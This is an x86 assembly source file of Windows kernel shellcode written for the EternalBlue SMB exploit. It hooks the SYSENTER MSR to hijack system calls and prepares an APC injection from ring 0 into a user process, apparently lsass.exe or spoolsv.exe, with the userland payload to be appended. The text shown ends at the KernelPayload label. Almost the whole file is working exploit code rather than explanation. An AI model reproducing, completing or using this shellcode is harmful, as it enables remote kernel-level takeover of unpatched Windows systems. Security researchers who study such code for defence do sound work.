;
; Windows x86 kernel shellcode from ring 0 to ring 3 by sleepya
; The shellcode is written for eternalblue exploit: eternalblue_exploit7.py
;
;
; Idea for Ring 0 to Ring 3 via APC from Sean Dillon (@zerosum0x0)
;
;
; Note:
; - The userland shellcode is run in a new thread of system process.
;     If userland shellcode causes any exception, the system process get killed.
; - On idle target with multiple core processors, the hijacked system call might take a while (> 5 minutes) to 
;     get call because system call is called on other processors.
; - Compiling shellcode with specific Windows version macro, corrupted buffer will be freed.
;     This helps running exploit against same target repeatly more reliable.
; - The userland payload MUST be appened to this shellcode.
;
; Reference:
; - http://www.geoffchappell.com/studies/windows/km/index.htm (structures info)
; - https://github.com/reactos/reactos/blob/master/reactos/ntoskrnl/ke/apc.c

BITS 32

PSGETCURRENTPROCESS_HASH    EQU    0xdbf47c78
PSGETPROCESSID_HASH    EQU    0x170114e1
PSGETPROCESSIMAGEFILENAME_HASH    EQU    0x77645f3f
LSASS_EXE_HASH    EQU    0xc1fa6a5a
SPOOLSV_EXE_HASH    EQU    0x3ee083d8
ZWALLOCATEVIRTUALMEMORY_HASH    EQU    0x576e99ea
PSGETTHREADTEB_HASH    EQU    0xcef84c3e
KEINITIALIZEAPC_HASH    EQU    0x6d195cc4
KEINSERTQUEUEAPC_HASH    EQU    0xafcc4634
PSGETPROCESSPEB_HASH    EQU    0xb818b848
CREATETHREAD_HASH    EQU    0x835e515e



DATA_ORIGIN_SYSCALL_OFFSET  EQU 0x0
DATA_MODULE_ADDR_OFFSET     EQU 0x4
DATA_QUEUEING_KAPC_OFFSET   EQU 0x8
DATA_EPROCESS_OFFSET        EQU 0xc
DATA_KAPC_OFFSET            EQU 0x10

section .text
global shellcode_start

shellcode_start:

setup_syscall_hook:
    ; IRQL is DISPATCH_LEVEL when got code execution
%ifdef WIN7
    mov eax, [esp+0x20]     ; fetch SRVNET_BUFFER address from function argument
    ; set nByteProcessed to free corrupted buffer after return
    mov ecx, [eax+0x14]
    mov [eax+0x1c], ecx
%elifdef WIN8
%endif
    
    pushad

    call _setup_syscall_hook_find_eip
_setup_syscall_hook_find_eip:
    pop ebx

    call set_ebp_data_address_fn
    
    ; read current syscall
    mov ecx, 0x176
    rdmsr
    ; do NOT replace saved original syscall address with hook syscall
    lea edi, [ebx+syscall_hook-_setup_syscall_hook_find_eip]
    cmp eax, edi
    je _setup_syscall_hook_done
    
    ; if (saved_original_syscall != &KiFastCallEntry) do_first_time_initialize
    cmp dword [ebp+DATA_ORIGIN_SYSCALL_OFFSET], eax
    je _hook_syscall
    
    ; save original syscall
    mov dword [ebp+DATA_ORIGIN_SYSCALL_OFFSET], eax
    
    ; first time on the target, clear the data area
    ; edx should be zero from rdmsr
    mov dword [ebp+DATA_QUEUEING_KAPC_OFFSET], edx

_hook_syscall:
    ; set a new syscall on running processor
    ; setting MSR 0x176 affects only running processor
    mov eax, edi
    xor edx, edx
    wrmsr
    
_setup_syscall_hook_done:
    popad
%ifdef WIN7
    xor eax, eax
%elifdef WIN8
    xor eax, eax
%endif
    ret 0x24

;========================================================================
; Find memory address in HAL heap for using as data area
; Arguments: ebx = any address in this shellcode
; Return: ebp = data address
;========================================================================
set_ebp_data_address_fn:
    ; On idle target without user application, syscall on hijacked processor might not be called immediately.
    ; Find some address to store the data, the data in this address MUST not be modified
    ;   when exploit is rerun before syscall is called
    lea ebp, [ebx + 0x1000]
    shr ebp, 12
    shl ebp, 12
    sub ebp, 0x50   ; for KAPC struct too
    ret


syscall_hook:
    mov ecx, 0x23
    push 0x30
    pop fs
    mov ds,cx
    mov es,cx
    mov ecx, dword [fs:0x40]
    mov esp, dword [ecx+4]
    
    push ecx    ; want this stack space to store original syscall addr
    pushfd
    pushad
    
    call _syscall_hook_find_eip
_syscall_hook_find_eip:
    pop ebx
    
    call set_ebp_data_address_fn
    mov eax, [ebp+DATA_ORIGIN_SYSCALL_OFFSET]
    
    add eax, 0x17   ; adjust syscall entry, so we do not need to reverse start of syscall handler
    mov [esp+0x24], eax ; 0x4 (pushfd) + 0x20 (pushad) = 0x24
    
    ; use lock cmpxchg for queueing APC only one at a time
    xor eax, eax
    cdq
    inc edx
    lock cmpxchg byte [ebp+DATA_QUEUEING_KAPC_OFFSET], dl
    jnz _syscall_hook_done

    ;======================================
    ; restore syscall
    ;======================================
    ; an error after restoring syscall should never occur
    mov ecx, 0x176
    cdq
    mov eax, [ebp+DATA_ORIGIN_SYSCALL_OFFSET]
    wrmsr
    
    ; allow interrupts while executing shellcode
    sti
    call KernelPayload 
    cli
    
_syscall_hook_done:
    popad
    popfd
    ret

KernelPayload:
